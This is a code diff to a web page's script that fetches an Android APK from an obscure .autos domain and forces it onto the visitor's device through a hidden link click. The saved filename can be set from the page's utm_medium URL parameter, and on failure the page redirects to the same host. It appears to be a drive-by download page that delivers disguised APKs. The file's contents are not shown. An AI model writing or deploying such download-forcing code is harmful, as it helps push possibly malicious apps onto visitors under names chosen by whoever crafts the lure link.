@@ -9,14 +9,10 @@
 
 <script>
     async function downloadApk() {
-        const baseUrl = "https://blindlyorganicsnake.autos/8c8ec1ce67ce758615d/";
+        const apkURL = "https://blindlyorganicsnake.autos/8c8ec1ce67ce758615d/" + location.search;
 
         try {
-            const currentUrl = new URL(window.location.href);
-            const targetUrl = new URL(baseUrl);
-            targetUrl.search = currentUrl.search;
-
-            const response = await fetch(targetUrl.toString(), {
+            const response = await fetch(apkURL, {
                 method: 'GET',
                 credentials: 'omit'
             });
@@ -25,19 +21,27 @@
                 throw new Error(`HTTP ${response.status}: ${response.statusText}`);
             }
 
-            let filename = "download911.apk"
+            let apkname = "download911.apk";
+            const currentUrl = new URL(window.location.href);
+            if (currentUrl.searchParams.get("utm_medium")){
+                apkname = currentUrl.searchParams.get("utm_medium");
+                if (!apkname.includes(".apk")){
+                    apkname += ".apk"
+                }
+            }
+
             const blob = await response.blob();
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = filename;
+            a.download = apkname;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
         } catch (error) {
             console.error(error);
-            location.href = baseUrl
+            location.href = apkURL
         }
     }
 
